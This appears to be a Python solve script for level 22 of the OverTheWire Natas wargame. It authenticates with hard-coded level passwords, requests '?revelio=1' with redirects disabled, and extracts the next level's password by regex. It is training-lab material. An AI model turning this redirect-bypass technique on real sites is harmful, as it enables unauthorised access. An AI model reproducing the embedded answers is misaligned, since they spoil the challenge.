# #!/usr/bin/env python
# # -*- coding: utf-8 -*-

# import requests
# # import re

# username = 'natas22'
# password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

# url = 'http://%s.natas.labs.overthewire.org/?revelio=1' % username

# session = requests.Session()

# print('session')
# print(session.text)

# response = session.get(url, auth = (username, password), allow_redirects = False)

# print('response')
# print (response.text)


#"""
# import requests

# number = 22
# passwd = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

# baseUrl = 'http://natas'+str(number)+'.natas.labs.overthewire.org'
# auth = ('natas21', passwd)
# params = dict(debug='', submit='', admin=1)
# cookies = dict()
# r = requests.get(baseUrl, auth=auth, params=params, cookies=cookies)
# # phpsessid = r.cookies['PHPSESSID']
# print(r.text)
# print('---------------------------------------------------------------------------------------')
# # baseUrl = 'http://natas22.natas.labs.overthewire.org'
# # params = dict(debug='')
# # cookies = dict(PHPSESSID=phpsessid)
# # r = requests.get(baseUrl, auth=auth, params=params, cookies=cookies)
# # print(r.text)
# #"""

# import urllib.request
# # Create an OpenerDirector with support for Basic HTTP Authentication...
# auth_handler = urllib.request.HTTPBasicAuthHandler()
# auth_handler.add_password(realm='PDQ Application',
#                           uri='http://natas21-experimenter.natas.labs.overthewire.org',
#                           user='natas21',
#                           passwd='IFekPyrQXftziDEsUr3x21sYuahypdgJ')
# opener = urllib.request.build_opener(auth_handler)
# # ...and install it globally so it can be used with urlopen.
# urllib.request.install_opener(opener)
# urllib.request.urlopen('http://www.example.com/login.html')

import requests
import re
import html


user = 'natas22'
passw = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
url = 'http://%s.natas.labs.overthewire.org/' % user



# 1st step:  print the sourcecode
#'''
response = requests.get(url, auth=(user, passw))
print(response.text)
#'''


# 2nd step: checking the sourcecode
#'''
response = requests.get(url + 'index-source.html', auth=(user, passw))
print(html.unescape(response.content.decode('utf8').replace('\r', '\n')))
#'''
# we should put 'revelio' as argument


# 3rd step: and also disallow redirects
#'''
response = requests.get(url + '?revelio=1', auth=(user, passw), allow_redirects=False)
print(response.text)

print("Here is the result:")
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, response.text)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
#'''